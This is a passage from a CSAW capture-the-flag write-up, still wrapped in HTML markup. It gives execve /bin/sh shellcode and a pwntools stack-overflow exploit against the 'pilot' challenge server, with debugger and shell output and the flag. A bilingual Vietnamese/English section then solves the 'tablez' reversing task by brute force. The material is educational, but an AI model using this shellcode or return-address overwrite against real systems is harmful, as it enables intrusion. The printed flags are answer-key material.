</span><span class="n">LEGEND</span><span class="o">:</span><span class="w"> </span><span class="n">STACK</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">HEAP</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">CODE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">DATA</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">RWX</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">RODATA</span><span class="w">
</span><span class="p">[</span><span class="err">──────────────────────────────────────────────────────────────────</span><span class="n">REGISTERS</span><span class="err">───────────────────────────────────────────────────────────────────</span><span class="p">]</span><span class="w">
</span><span class="o">*</span><span class="n">RAX</span><span class="w">  </span><span class="mh">0x7fffffffe0a0</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0x400b90</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">push</span><span class="w">   </span><span class="n">r15</span><span class="w">
 </span><span class="n">RBX</span><span class="w">  </span><span class="mh">0x0</span><span class="w">
</span><span class="o">*</span><span class="n">RCX</span><span class="w">  </span><span class="mh">0x7f1788dd3720</span><span class="w"> </span><span class="p">(</span><span class="err">__</span><span class="n">write_nocancel</span><span class="m">+7</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">cmp</span><span class="w">    </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="m">-0</span><span class="n">xfff</span><span class="w">
</span><span class="o">*</span><span class="n">RDX</span><span class="w">  </span><span class="mh">0x40</span><span class="w">
 </span><span class="n">RDI</span><span class="w">  </span><span class="mh">0x0</span><span class="w">
</span><span class="o">*</span><span class="n">RSI</span><span class="w">  </span><span class="mh">0x7fffffffe0a0</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0x400b90</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">push</span><span class="w">   </span><span class="n">r15</span><span class="w">
</span><span class="o">*</span><span class="n">R8</span><span class="w">   </span><span class="mh">0x7f1789091700</span><span class="w"> </span><span class="p">(</span><span class="n">proc_file_chain_lock</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="m">0</span><span class="w">
</span><span class="o">*</span><span class="n">R9</span><span class="w">   </span><span class="mh">0x7f1789090600</span><span class="w"> </span><span class="p">(</span><span class="err">_</span><span class="n">IO_2_1_stdout_</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">xchg</span><span class="w">   </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">[</span><span class="n">rax</span><span class="p">],</span><span class="w"> </span><span class="n">ebp</span><span class="w"> </span><span class="o">/*</span><span class="w"> </span><span class="mh">0xfbad2887</span><span class="w"> </span><span class="o">*/</span><span class="w">
</span><span class="o">*</span><span class="n">R10</span><span class="w">  </span><span class="mh">0x60d</span><span class="w">
</span><span class="o">*</span><span class="n">R11</span><span class="w">  </span><span class="mh">0x246</span><span class="w">
</span><span class="o">*</span><span class="n">R12</span><span class="w">  </span><span class="mh">0x4008b0</span><span class="w"> </span><span class="p">(</span><span class="n">entry0</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">xor</span><span class="w">    </span><span class="n">ebp</span><span class="p">,</span><span class="w"> </span><span class="n">ebp</span><span class="w">
</span><span class="o">*</span><span class="n">R13</span><span class="w">  </span><span class="mh">0x7fffffffe1a0</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mh">0x1</span><span class="w">
 </span><span class="n">R14</span><span class="w">  </span><span class="mh">0x0</span><span class="w">
 </span><span class="n">R15</span><span class="w">  </span><span class="mh">0x0</span><span class="w">
</span><span class="o">*</span><span class="n">RBP</span><span class="w">  </span><span class="mh">0x7fffffffe0c0</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0x400b90</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">push</span><span class="w">   </span><span class="n">r15</span><span class="w">
</span><span class="o">*</span><span class="n">RSP</span><span class="w">  </span><span class="mh">0x7fffffffe0a0</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0x400b90</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">push</span><span class="w">   </span><span class="n">r15</span><span class="w">
</span><span class="o">*</span><span class="n">RIP</span><span class="w">  </span><span class="mh">0x400ae0</span><span class="w"> </span><span class="p">(</span><span class="n">main</span><span class="m">+314</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">call</span><span class="w">   </span><span class="mh">0x400820</span><span class="w">
</span><span class="p">[</span><span class="err">────────────────────────────────────────────────────────────────────</span><span class="n">DISASM</span><span class="err">────────────────────────────────────────────────────────────────────</span><span class="p">]</span><span class="w">
 </span><span class="err">►</span><span class="w"> </span><span class="mh">0x400ae0</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="m">+314</span><span class="o">&gt;</span><span class="w">    </span><span class="n">call</span><span class="w">   </span><span class="n">read</span><span class="o">@</span><span class="n">plt</span><span class="w">                      </span><span class="o">&lt;</span><span class="mh">0x400820</span><span class="o">&gt;</span><span class="w">
        </span><span class="n">fd</span><span class="o">:</span><span class="w"> </span><span class="mh">0x0</span><span class="w">
        </span><span class="n">buf</span><span class="o">:</span><span class="w"> </span><span class="mh">0x7fffffffe0a0</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0x400b90</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">push</span><span class="w">   </span><span class="n">r15</span><span class="w">
        </span><span class="n">nbytes</span><span class="o">:</span><span class="w"> </span><span class="mh">0x40</span><span class="w">
</span></pre></table></code></div></div><p>As you can see, the address of the input buffer is identical to the address printed in the output of the binary. Since the stack is executable, we only need to put shellcode onto the buffer and overwrite the return address with the address of the input buffer. I slightly modified the shellcode to extend the stack for the actual execution of the shellcode.</p><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="w">   </span><span class="m">0</span><span class="o">:</span><span class="w">   </span><span class="m">48</span><span class="w"> </span><span class="m">83</span><span class="w"> </span><span class="n">ec</span><span class="w"> </span><span class="m">48</span><span class="w">             </span><span class="n">sub</span><span class="w">    </span><span class="n">rsp</span><span class="p">,</span><span class="mh">0x48</span><span class="w">
   </span><span class="m">4</span><span class="o">:</span><span class="w">   </span><span class="m">48</span><span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="n">d2</span><span class="w">                </span><span class="n">xor</span><span class="w">    </span><span class="n">rdx</span><span class="p">,</span><span class="n">rdx</span><span class="w">
   </span><span class="m">7</span><span class="o">:</span><span class="w">   </span><span class="m">48</span><span class="w"> </span><span class="n">bb</span><span class="w"> </span><span class="n">ff</span><span class="w"> </span><span class="m">2</span><span class="n">f</span><span class="w"> </span><span class="m">62</span><span class="w"> </span><span class="m">69</span><span class="w"> </span><span class="m">6</span><span class="n">e</span><span class="w">    </span><span class="n">movabs</span><span class="w"> </span><span class="n">rbx</span><span class="p">,</span><span class="mh">0x68732f6e69622fff</span><span class="w">
   </span><span class="n">e</span><span class="o">:</span><span class="w">   </span><span class="m">2</span><span class="n">f</span><span class="w"> </span><span class="m">73</span><span class="w"> </span><span class="m">68</span><span class="w"> 
  </span><span class="m">11</span><span class="o">:</span><span class="w">   </span><span class="m">48</span><span class="w"> </span><span class="n">c1</span><span class="w"> </span><span class="n">eb</span><span class="w"> </span><span class="m">08</span><span class="w">             </span><span class="n">shr</span><span class="w">    </span><span class="n">rbx</span><span class="p">,</span><span class="mh">0x8</span><span class="w">
  </span><span class="m">15</span><span class="o">:</span><span class="w">   </span><span class="m">53</span><span class="w">                      </span><span class="n">push</span><span class="w">   </span><span class="n">rbx</span><span class="w">
  </span><span class="m">16</span><span class="o">:</span><span class="w">   </span><span class="m">48</span><span class="w"> </span><span class="m">89</span><span class="w"> </span><span class="n">e7</span><span class="w">                </span><span class="n">mov</span><span class="w">    </span><span class="n">rdi</span><span class="p">,</span><span class="n">rsp</span><span class="w">
  </span><span class="m">19</span><span class="o">:</span><span class="w">   </span><span class="m">48</span><span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="n">c0</span><span class="w">                </span><span class="n">xor</span><span class="w">    </span><span class="n">rax</span><span class="p">,</span><span class="n">rax</span><span class="w">
  </span><span class="m">1</span><span class="n">c</span><span class="o">:</span><span class="w">   </span><span class="m">50</span><span class="w">                      </span><span class="n">push</span><span class="w">   </span><span class="n">rax</span><span class="w">
  </span><span class="m">1</span><span class="n">d</span><span class="o">:</span><span class="w">   </span><span class="m">57</span><span class="w">                      </span><span class="n">push</span><span class="w">   </span><span class="n">rdi</span><span class="w">
  </span><span class="m">1</span><span class="n">e</span><span class="o">:</span><span class="w">   </span><span class="m">48</span><span class="w"> </span><span class="m">89</span><span class="w"> </span><span class="n">e6</span><span class="w">                </span><span class="n">mov</span><span class="w">    </span><span class="n">rsi</span><span class="p">,</span><span class="n">rsp</span><span class="w">
  </span><span class="m">21</span><span class="o">:</span><span class="w">   </span><span class="n">b0</span><span class="w"> </span><span class="m">3</span><span class="n">b</span><span class="w">                   </span><span class="n">mov</span><span class="w">    </span><span class="n">al</span><span class="p">,</span><span class="mh">0x3b</span><span class="w">
  </span><span class="m">23</span><span class="o">:</span><span class="w">   </span><span class="m">0</span><span class="n">f</span><span class="w"> </span><span class="m">05</span><span class="w">                   </span><span class="n">syscall</span><span class="w">
</span></pre></table></code></div></div><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>

<span class="n">s</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">pwn.chal.csaw.io</span><span class="sh">'</span><span class="p">,</span> <span class="mi">8464</span><span class="p">)</span>

<span class="nf">raw_input</span><span class="p">(</span><span class="sh">'</span><span class="s">Exploit?</span><span class="sh">'</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\x48\x83\xEC\x48\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05</span><span class="sh">"</span>

<span class="n">s</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="s">[*]Location:</span><span class="sh">'</span><span class="p">)</span>
<span class="n">leak_buffer</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">).</span><span class="nf">strip</span><span class="p">()</span>
<span class="k">print</span> <span class="n">leak_buffer</span>
<span class="n">leak_buffer</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">leak_buffer</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="s">[*]Command:</span><span class="sh">'</span><span class="p">)</span>

<span class="k">print</span> <span class="sh">'</span><span class="s">Shellcode is at:</span><span class="sh">'</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">leak_buffer</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sh">''</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">40</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">leak_buffer</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</pre></table></code></div></div><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="n">exploit.py</span><span class="w"> 
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Opening</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">pwn.chal.csaw.io</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="m">8464</span><span class="o">:</span><span class="w"> </span><span class="n">Done</span><span class="w">
</span><span class="n">Exploit</span><span class="o">?</span><span class="w">
</span><span class="mh">0x7ffe3cf25d80</span><span class="w">
</span><span class="n">Shellcode</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">at</span><span class="o">:</span><span class="w"> </span><span class="mh">0x7ffe3cf25d80</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Switching</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">interactive</span><span class="w"> </span><span class="n">mode</span><span class="w">
</span><span class="o">$</span><span class="w"> </span><span class="n">id</span><span class="w">
</span><span class="n">uid</span><span class="o">=</span><span class="m">1000</span><span class="p">(</span><span class="n">pilot</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="m">1000</span><span class="p">(</span><span class="n">pilot</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="m">1000</span><span class="p">(</span><span class="n">pilot</span><span class="p">)</span><span class="w">
</span><span class="o">$</span><span class="w"> </span><span class="n">whoami</span><span class="w">
</span><span class="n">pilot</span><span class="w">
</span><span class="o">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">flag</span><span class="w">
</span><span class="n">flag</span><span class="p">{</span><span class="m">1</span><span class="n">nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys</span><span class="p">}</span><span class="w">
</span><span class="o">$</span><span class="w">  
</span></pre></table></code></div></div><h2 id="re-tablez-100-pts">RE: tablez (100 pts.)</h2><p><a href="#english-tablez">English version here</a></p><h6 id="vietnamese-1">Vietnamese</h6><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="n">file</span><span class="w"> </span><span class="n">tablez</span><span class="w"> 
</span><span class="n">tablez</span><span class="o">:</span><span class="w"> </span><span class="n">ELF</span><span class="w"> </span><span class="m">64</span><span class="o">-</span><span class="n">bit</span><span class="w"> </span><span class="n">LSB</span><span class="w"> </span><span class="n">shared</span><span class="w"> </span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">x86</span><span class="m">-64</span><span class="p">,</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="p">(</span><span class="n">SYSV</span><span class="p">),</span><span class="w"> </span><span class="n">dynamically</span><span class="w"> </span><span class="n">linked</span><span class="p">,</span><span class="w"> </span><span class="n">interpreter</span><span class="w"> </span><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="m">-64</span><span class="n">.so.2</span><span class="p">,</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="m">3.2.0</span><span class="p">,</span><span class="w"> </span><span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="m">72</span><span class="n">adea86090fb7deeb319e95681fd2c669dcc503</span><span class="p">,</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">stripped</span><span class="w">
</span></pre></table></code></div></div><p>Như vậy rất may mắn là binary này không bị stripped. Mở binary lên bằng r2 và xem qua hàm main thì có một số điểm đáng chú ý sau:</p><ol><li>Dữ liệu được hardcoded từ <code class="language-plaintext highlighter-rouge">0x000008ba</code> tới <code class="language-plaintext highlighter-rouge">0x00000908</code><li>Input được nhập vào biến <code class="language-plaintext highlighter-rouge">local_90h</code> ở <code class="language-plaintext highlighter-rouge">0x00000924</code><li>Một vòng lặp gọi hàm <code class="language-plaintext highlighter-rouge">sym.get_tbl_entry</code> với tham số là input. Kết quả hàm này trả về được dùng để thay thế các ký tự trên input buffer.<li>input buffer sau khi bị biến đổi qua vòng lặp ở 3 sẽ được so sánh với dữ liệu hardcoded ở 1 bằng hàm strncmp (<code class="language-plaintext highlighter-rouge">0x000009f7</code>). <code class="language-plaintext highlighter-rouge">0x26</code> ký tự đầu tiên sẽ được so sánh.</ol><p>Hàm <code class="language-plaintext highlighter-rouge">sym.get_tbl_entry</code> hoạt động như sau:</p><pre><code class="language-C">for (int i = 0; i &lt;= 0xfe; i++) {
  if (trans_tbl[i * 2] == input[i]) {
    return trans_tbl[i * 2 + 1];
  }
}
return 0;
</code></pre><p>với <code class="language-plaintext highlighter-rouge">trans_tbl</code> là một biến toàn cục đã được viết trước.</p><p>Như vậy, cách làm của mình như sau:</p><ol><li>Lấy dữ liệu từ bản trans_tbl và dự liệu hardcode trong hàm main ra (mình gọi là password). Để lấy dữ liệu từ bảng <code class="language-plaintext highlighter-rouge">obj.trans_tbl</code>: <code class="language-plaintext highlighter-rouge">pr 0xff@ obj.trans_tbl &gt; data.bin</code> (Print Raw 0xff bytes at address of obj.trans_tbl, redirect output to file data.bin)<li>Với mỗi ký tự trong password, bruteforce tất cả các ký tự ASCII để tìm một ký tự c sao cho c sau khi qua hàm <code class="language-plaintext highlighter-rouge">get_tbl_entry</code> sẽ biến đổi thành ký tự ở vị trí tương ứng trong password.</ol><p>Solution:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">string</span> <span class="kn">import</span> <span class="n">printable</span>

<span class="k">def</span> <span class="nf">get_char</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">trans_tbl</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mh">0xfe</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">trans_tbl</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">c</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">trans_tbl</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
    <span class="k">return</span> <span class="mi">0</span>

<span class="n">trans_tbl</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">trans_tbl</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
<span class="n">password</span> <span class="o">=</span> <span class="sh">''</span>
<span class="n">password</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xb1e711f59d73b327</span><span class="p">)</span>
<span class="n">password</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x30f4f9f9b399beb3</span><span class="p">)</span>
<span class="n">password</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xb19965237399711b</span><span class="p">)</span>
<span class="n">password</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xf9279923be111165</span><span class="p">)</span>
<span class="n">password</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x65059923</span><span class="p">)</span>
<span class="n">password</span> <span class="o">=</span> <span class="n">password</span><span class="p">.</span><span class="nf">strip</span><span class="p">(</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>

<span class="n">flag</span> <span class="o">=</span> <span class="sh">''</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">password</span><span class="p">)):</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">printable</span><span class="p">:</span>
        <span class="k">if</span> <span class="nf">get_char</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">==</span> <span class="n">password</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="n">c</span>
            <span class="k">break</span>
<span class="k">print</span> <span class="n">flag</span>
</pre></table></code></div></div><p><a name="english-tablez"></a></p><h6 id="english-1">English</h6><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="n">file</span><span class="w"> </span><span class="n">tablez</span><span class="w"> 
</span><span class="n">tablez</span><span class="o">:</span><span class="w"> </span><span class="n">ELF</span><span class="w"> </span><span class="m">64</span><span class="o">-</span><span class="n">bit</span><span class="w"> </span><span class="n">LSB</span><span class="w"> </span><span class="n">shared</span><span class="w"> </span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">x86</span><span class="m">-64</span><span class="p">,</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="p">(</span><span class="n">SYSV</span><span class="p">),</span><span class="w"> </span><span class="n">dynamically</span><span class="w"> </span><span class="n">linked</span><span class="p">,</span><span class="w"> </span><span class="n">interpreter</span><span class="w"> </span><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="m">-64</span><span class="n">.so.2</span><span class="p">,</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="m">3.2.0</span><span class="p">,</span><span class="w"> </span><span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="m">72</span><span class="n">adea86090fb7deeb319e95681fd2c669dcc503</span><span class="p">,</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">stripped</span><span class="w">
</span></pre></table></code></div></div><p>Fortunately, this binary is not stripped. After examining the main function, there are several noticeable points:</p><ol><li>There is hardcoded data, seen from <code class="language-plaintext highlighter-rouge">0x000008ba</code> to <code class="language-plaintext highlighter-rouge">0x00000908</code><li>The input buffer is <code class="language-plaintext highlighter-rouge">local_90h</code>, seen at <code class="language-plaintext highlighter-rouge">0x00000924</code><li>A loop calls to <code class="language-plaintext highlighter-rouge">sym.get_tbl_entry</code> with the input buffer as the parameter. The returned results are used to replace data on the input buffer.<li>The input buffer after being transformed in #3 is compared to the hardcoded data in #1 using strncmp (<code class="language-plaintext highlighter-rouge">0x000009f7</code>). The first <code class="language-plaintext highlighter-rouge">0x26</code> characters are compared.</ol><p>Pseudo code for <code class="language-plaintext highlighter-rouge">sym.get_tbl_entry</code>:</p><pre><code class="language-C">for (int i = 0; i &lt;= 0xfe; i++) {
  if (trans_tbl[i * 2] == input[i]) {
    return trans_tbl[i * 2 + 1];
  }
}
return 0;
</code></pre><p>with <code class="language-plaintext highlighter-rouge">trans_tbl</code> is an initialized global variable.</p><p>My solution:</p><ol><li>Extract data from <code class="language-plaintext highlighter-rouge">trans_tbl</code> and the hardcoded data at the beginning of main (called password). To extract data from <code class="language-plaintext highlighter-rouge">obj.trans_tbl</code> using r2: <code class="language-plaintext highlighter-rouge">pr 0xff@ obj.trans_tbl &gt; data.bin</code> (Print Raw 0xff bytes at address of obj.trans_tbl, redirect output to file data.bin)<li>For each character in the password, bruteforce all ASCII characters to find a character c such that c after being transformed by <code class="language-plaintext highlighter-rouge">get_tbl_entry</code> will be the corressponding character in the password.</ol><p>Solution:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">string</span> <span class="kn">import</span> <span class="n">printable</span>

<span class="k">def</span> <span class="nf">get_char</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">trans_tbl</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mh">0xfe</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">trans_tbl</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">c</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">trans_tbl</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
    <span class="k">return</span> <span class="mi">0</span>

<span class="n">trans_tbl</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">trans_tbl</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
<span class="n">password</span> <span class="o">=</span> <span class="sh">''</span>
<span class="n">password</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xb1e711f59d73b327</span><span class="p">)</span>
<span class="n">password</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x30f4f9f9b399beb3</span><span class="p">)</span>
<span class="n">password</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xb19965237399711b</span><span class="p">)</span>
<span class="n">password</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xf9279923be111165</span><span class="p">)</span>
<span class="n">password</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x65059923</span><span class="p">)</span>
<span class="n">password</span> <span class="o">=</span> <span class="n">password</span><span class="p">.</span><span class="nf">strip</span><span class="p">(</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>

<span class="n">flag</span> <span class="o">=</span> <span class="sh">''</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">password</span><span class="p">)):</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">printable</span><span class="p">:</span>
        <span class="k">if</span> <span class="nf">get_char</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">==</span> <span class="n">password</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="n">c</span>
            <span class="k">break</span>
<span class="k">print</span> <span class="n">flag</span>
